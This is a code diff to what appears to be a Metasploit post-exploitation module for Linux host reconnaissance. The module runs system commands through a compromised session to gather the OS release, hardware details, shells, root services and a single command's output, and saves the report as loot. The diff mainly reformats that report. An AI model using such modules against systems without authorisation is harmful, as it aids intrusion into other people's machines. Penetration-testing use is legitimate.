@@ -108,12 +108,13 @@ class MetasploitModule < Msf::Post
                                 [
                                          [ 'Linux' ]
                                 ],
-                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
+                        'DefaultTarget'  => '1', # default its to run againts linux targets
                         'References'     =>
                                 [
-                                         [ 'URL', 'http://goo.gl/Tm44Y2' ],
+                                         [ 'URL', 'http://goo.gl/RzP3DM' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
-                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
+                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
+                                         [ 'URL', 'http://rapid7.github.io/metasploit-framework/api/' ]
                                 ],
 			'DefaultOptions' =>
 				{
@@ -203,8 +204,9 @@ def run
       #
       date_out = cmd_exec("date")
       distro_uname = cmd_exec("uname -a")
-      distro_release = cmd_exec("cat /etc/*-release | grep 'DISTRIB_RELEASE='; cat /etc/*-release | grep 'DISTRIB_DESCRIPTION='; cat /etc/*-release | grep 'VERSION_ID='; cat /etc/*-release | grep 'ID_LIKE='")
-      hardware_info = cmd_exec("lscpu | grep 'Architecture'; lscpu | grep 'CPU op-mode'; lscpu | grep 'Vendor ID'")
+      distro_release = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION='")
+      hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode'")
+      hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID'")
       current_shell = cmd_exec("echo $0")
       system_shell = cmd_exec("echo $SHELL")
       distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
@@ -212,25 +214,20 @@ def run
         # Store data into an variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
-        data_dump << "[*]" + date_out
+        data_dump << "[*] " + date_out
         data_dump << "\n\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
+        data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
+        data_dump << "Target Arch (vendor): #{hardware_vendor}\n"
         data_dump << "Computer            : #{sys_info['Computer']}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
         data_dump << "Payload directory   : #{payload_path}\n"
-        data_dump << "Operative System    : #{sys_info['OS']}\n"
-        data_dump << "DISTRO UNAME        : #{distro_uname}\n"
         data_dump << "Client UID          : #{target_uid}\n"
-        data_dump << "\n\n"
-        data_dump << "HARDWARE INFO\n"
-        data_dump << "-------------\n"
-        data_dump << hardware_info
-        data_dump << "\n\n"
-        data_dump << "DISTRO RELEASE\n"
-        data_dump << "--------------\n"
-        data_dump << distro_release
-        data_dump << "\n\n"
+        data_dump << "Operative System    : #{sys_info['OS']}\n"
+        data_dump << "Distro uname        : #{distro_uname}\n"
+        data_dump << "Distro release      : #{distro_release}\n"
+        data_dump << "\n\n\n"
         data_dump << "CURRENT SHELL\n"
         data_dump << "-------------\n"
         data_dump << current_shell
@@ -269,6 +266,11 @@ def run
             # store data into an variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
+            data_dump << "\n"
+            data_dump << "+------------------------+\n"
+            data_dump << "| AGRESSIVE SCAN REPORTS |\n"
+            data_dump << "+------------------------+\n"
+            data_dump << "\n\n"
             data_dump << "ROOT SERVICES RUNNING\n"
             data_dump << "---------------------\n"
             data_dump << root_services
@@ -314,8 +316,10 @@ def run
             # store data into an variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "COMMAND EXECUTED OUTPUT\n"
-            data_dump << "-----------------------\n"
+            data_dump << "\n"
+            data_dump << "+-------------------------+\n"
+            data_dump << "| COMMAND EXECUTED OUTPUT |\n"
+            data_dump << "+-------------------------+\n"
             data_dump << single_comm
             data_dump << "\n\n"
         end
@@ -325,22 +329,24 @@ def run
        # Displaying results on screen (data_dump) ..
        #
        print_status("Remote scans completed, building list ..")
-       print_line("")
-       Rex::sleep(1.0)
+       Rex::sleep(0.5)
+         #
+         # Store 'data_dump' contents into msf loot folder (local) ..
+         # if sellected previous in advanced options (set STORE_LOOT true) ..
+         #
+         if datastore['STORE_LOOT'] == true
+           print_warning("Target fingerprints stored under: ~/.msf4/loot (folder)")
+           store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
+         end
+       #
        # print the contents of 'data_dump' variable ..
+       #
+       Rex::sleep(0.5)
+       print_line("")
        print_line(data_dump)
        print_line("")
        Rex::sleep(0.5)
 
-
-     #
-     # Store 'data_dump' contents into msf loot folder (local) ..
-     # if sellected previous in advanced options (set STORE_LOOT true) ..
-     #
-     if datastore['STORE_LOOT'] == true
-       print_warning("Target fingerprints stored under: ~/.msf4/loot (folder)")
-       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
-     end
 
    #
    # end of the 'def run()' funtion ..
